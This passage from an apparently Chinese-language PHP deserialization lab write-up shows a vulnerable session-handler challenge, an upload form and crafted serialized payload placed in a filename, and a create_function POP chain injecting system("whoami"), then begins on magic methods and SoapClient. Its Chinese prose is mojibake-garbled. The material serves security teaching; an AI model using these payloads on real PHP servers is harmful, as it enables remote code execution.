class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># index.php</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;name==<span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            phpinfo();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯<code>session.upload_progress</code>çš„ååºåˆ—åŒ–</p><p>è§£é¢˜æ€è·¯</p><p>å…ˆæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“å–ä¸Šä¼ æ–‡ä»¶çš„åŒ…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># wp.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name == <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            phpinfo();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> test();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">//è¾“å‡º: O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;flag&quot;;&#125;</span><br><span class="hljs-comment">//æ›´æ”¹ä¸ºï¼šO:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>åœ¨åŒ…ä¸­å°†<code>filename</code>æ›´æ”¹ä¸º<code>|O:4:\&quot;test\&quot;:1:&#123;s:4:\&quot;name\&quot;;s:4:\&quot;flag\&quot;;&#125;</code></p><p><img src="/2022/05/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/19.png"></p><h3 id="0x02-ç›¸å…³åŸºç¡€"><a href="#0x02-ç›¸å…³åŸºç¡€" class="headerlink" title="0x02 ç›¸å…³åŸºç¡€"></a>0x02 ç›¸å…³åŸºç¡€</h3><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>PHPä¸­çš„å†…ç½®å‡½æ•°ï¼Œç”¨äºåœ¨PHPä¸­åˆ›å»ºåŒ¿å(lambda-style)å‡½æ•°ã€‚</p><p>ä½¿ç”¨èŒƒå›´ï¼š<code>PHP 4&gt; = 4.0.1ï¼ŒPHP 5ï¼ŒPHP 7</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># è¯­æ³•</span><br>create_function(<span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span>,<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br><span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span> å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ†<br><span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ†<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># ä¸¾ä¸ªæ —å­</span><br><span class="hljs-variable">$func</span> = create_function(<span class="hljs-string">&#x27;$a,$b&#x27;</span>,<span class="hljs-string">&#x27;return $a + $b;&#x27;</span>);<br>var_dump(<span class="hljs-variable">$func</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br><br><span class="hljs-comment"># ç›¸å½“äº</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$a</span> + <span class="hljs-variable">$b</span>;&#125;<br></code></pre></td></tr></table></figure><h4 id="å¯å˜å‡½æ•°"><a href="#å¯å˜å‡½æ•°" class="headerlink" title="å¯å˜å‡½æ•°"></a>å¯å˜å‡½æ•°</h4><p>PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚</p><h5 id="1-åŸºç¡€å¯å˜å‡½æ•°"><a href="#1-åŸºç¡€å¯å˜å‡½æ•°" class="headerlink" title="1 åŸºç¡€å¯å˜å‡½æ•°"></a>1 åŸºç¡€å¯å˜å‡½æ•°</h5><p>å˜é‡å€¼ä¸ºæŸä¸€å‡½æ•°åï¼Œåˆ™åœ¨å˜é‡ååŠ ä¸Šåœ†æ‹¬å·å°±å¯ä»¥è°ƒç”¨ç›¸åº”å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æ¡ˆä¾‹æ¥æº phpä¸­æ–‡ç½‘https://www.php.net/manual/zh/functions.variable-functions.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;In foo()&lt;br /&gt;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;In bar(); argument was &#x27;<span class="hljs-subst">$arg</span>&#x27;.&lt;br /&gt;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ echo çš„åŒ…è£…å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echoit</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span>;<br>&#125;<br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;foo&#x27;</span>;<br><span class="hljs-variable">$func</span>();        <span class="hljs-comment">// è°ƒç”¨ foo()</span><br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// è°ƒç”¨ bar()</span><br><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;echoit&#x27;</span>;<br><span class="hljs-variable">$func</span>(<span class="hljs-string">&#x27;test&#x27;</span>);  <span class="hljs-comment">// è°ƒç”¨ echoit()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="2-å¯å˜å‡½æ•°è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•"><a href="#2-å¯å˜å‡½æ•°è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•" class="headerlink" title="2 å¯å˜å‡½æ•°è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•"></a>2 å¯å˜å‡½æ•°è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</h5><p>è·Ÿä¸Šé¢ä¸€æ ·åªä¸è¿‡åŠ ä¸Šç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># æ¡ˆä¾‹æ¥æº PHPä¸­æ–‡ç½‘</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Variable</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Bar&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;<span class="hljs-variable">$name</span>(); <span class="hljs-comment">// è°ƒç”¨ Bar() æ–¹æ³•</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Bar</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is Bar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$foo</span> = <span class="hljs-keyword">new</span> Foo();<br><span class="hljs-variable">$funcname</span> = <span class="hljs-string">&quot;Variable&quot;</span>;<br><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-variable">$funcname</span>();  <span class="hljs-comment">// è°ƒç”¨ $foo-&gt;Variable()</span><br><br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment"># éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“è°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œå‡½æ•°è°ƒç”¨è¦æ¯”é™æ€å±æ€§ä¼˜å…ˆ</span><br></code></pre></td></tr></table></figure><h5 id="3-å¤æ‚è°ƒç”¨"><a href="#3-å¤æ‚è°ƒç”¨" class="headerlink" title="3 å¤æ‚è°ƒç”¨"></a>3 å¤æ‚è°ƒç”¨</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Foo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bar\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">baz</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;baz\n&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å½“æ•°ç»„0ä½å…ƒç´ ä¸ºç±»åï¼Œ1ä½å…ƒç´ ä¸ºæ–¹æ³•åæ—¶ï¼Œåœ¨è°ƒç”¨å¯å˜å‡½æ•°æ—¶ä¼šæ‰¾åˆ°è¯¥ç±»è¯¥æ–¹æ³•</span><br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// æ‰“å° &quot;bar&quot;</span><br><br><span class="hljs-comment">// å½“æ•°ç»„0ä½å…ƒç´ ä¸ºç±»åï¼Œ1ä½å…ƒç´ ä¸ºæ–¹æ³•åæ—¶ï¼Œåœ¨è°ƒç”¨å¯å˜å‡½æ•°æ—¶ä¼šæ‰¾åˆ°è¯¥ç±»è¯¥æ–¹æ³•</span><br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Foo, <span class="hljs-string">&quot;baz&quot;</span>);<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// æ‰“å° &quot;baz&quot;</span><br><br><span class="hljs-comment">// PHP5.6.9æ—¶æ— æ³•ä½¿ç”¨ï¼ŒPHP7.0.xå¯ä»¥ä½¿ç”¨</span><br><span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;Foo::bar&quot;</span>;<br><span class="hljs-variable">$func</span>(); <span class="hljs-comment">// æ‰“å° &quot;bar&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>okï¼Œè¿™ä¸¤ä¸ªçœ‹å®Œå¯ä»¥ç»§ç»­é¢˜ç›®äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">func</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;                    <span class="hljs-comment">// keyåº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)//ææ„å‡½æ•°ï¼Œå¯¹è±¡åœ¨é”€æ¯æ—¶è°ƒç”¨</span><br><span class="hljs-function">    </span>&#123;<br>        unserialize(<span class="hljs-keyword">$this</span>-&gt;key)();<span class="hljs-comment">// ç»“å°¾æœ‰ä¸ªæ‹¬å·ï¼Œå¯å˜å‡½æ•°</span><br>    &#125; <span class="hljs-comment">// è°ƒç”¨GetFlagç±»ä¸­çš„get_flag()</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&#x27;;&#125;system(&quot;whoami&quot;);//&#x27;</span>;<span class="hljs-comment">// é—­åˆå‰é¢ï¼Œæ³¨é‡Šåé¢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;create_function&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//æœ€ç»ˆç›®çš„</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">$this</span>-&gt;action;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> func;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> GetFlag;<br><span class="hljs-variable">$a</span>-&gt;key = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$b</span>,<span class="hljs-string">&quot;get_flag&quot;</span>));<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">// è¾“å‡ºï¼šO:4:&quot;func&quot;:1:&#123;s:3:&quot;key&quot;;s:123:&quot;a:2:&#123;i:0;O:7:&quot;GetFlag&quot;:2:&#123;s:4:&quot;code&quot;;s:21:&quot;;&#125;system(&quot;whoami&quot;);//&quot;;s:6:&quot;action&quot;;s:15:&quot;create_function&quot;;&#125;i:1;s:8:&quot;get_flag&quot;;&#125;&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h4 id="PHPçš„é­”æ³•å‡½æ•°"><a href="#PHPçš„é­”æ³•å‡½æ•°" class="headerlink" title="PHPçš„é­”æ³•å‡½æ•°"></a>PHPçš„é­”æ³•å‡½æ•°</h4><table><thead><tr><th><strong>é­”æœ¯æ–¹æ³•</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>__wakeup()</td><td>æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°(å¦‚æœæœ‰)</td></tr><tr><td>__sleep()</td><td>æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</td></tr><tr><td>__destruct()</td><td>å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</td></tr><tr><td>__call()</td><td>åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</td></tr><tr><td>__callStatic()</td><td>åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</td></tr><tr><td>__get()</td><td>ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</td></tr><tr><td>__set()</td><td>ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</td></tr><tr><td>__isset()</td><td>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</td></tr><tr><td>__unset()</td><td>åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</td></tr><tr><td>__toString()</td><td>æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</td></tr><tr><td>__invoke()</td><td>å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</td></tr><tr><td>__construct</td><td>å¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–æ—¶æ‰§è¡Œçš„</td></tr></tbody></table><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p><p>é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼</p><p>(PHP 5, PHP 7, PHP 8)</p><p>ç±»æ‘˜è¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">SoapClient &#123;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> __construct ( <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$wsdl</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> = [] )<br>    <span class="hljs-keyword">public</span> __call ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> __doRequest ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$request</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$action</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$version</span> , <span class="hljs-keyword">bool</span> <span class="hljs-variable">$oneWay</span> = <span class="hljs-literal">false</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getCookies ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">public</span> __getFunctions ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastRequest ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastRequestHeaders ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastResponse ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getLastResponseHeaders ( ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __getTypes ( ) : <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __setCookie ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$value</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> __setLocation ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$location</span> = <span class="hljs-string">&quot;&quot;</span> ) : <span class="hljs-keyword">string</span>|<span class="hljs-literal">null</span><br>    <span class="hljs-keyword">public</span> __setSoapHeaders ( SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$headers</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">bool</span><br>    <span class="hljs-keyword">public</span> __soapCall ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$options</span> = <span class="hljs-literal">null</span> , SoapHeader|<span class="hljs-keyword">array</span>|<span class="hljs-literal">null</span> <span class="hljs-variable">$inputHeaders</span> = <span class="hljs-literal">null</span> , <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$outputHeaders</span> = <span class="hljs-literal">null</span> ) : <span class="hljs-keyword">mixed</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åŸç”Ÿç±»ä¸­æœ‰ä¸€ä¸ª<code>__call()</code>ï¼Œå½“<code>__call()</code>è¢«è§¦å‘æ—¶ï¼Œå¯ä»¥å‘é€ä»»æ„çš„<code>http</code>å’Œ<code>https</code>è¯·æ±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient::__call(<span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span><br><br><span class="hljs-comment"># $name:ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</span><br><span class="hljs-comment"># 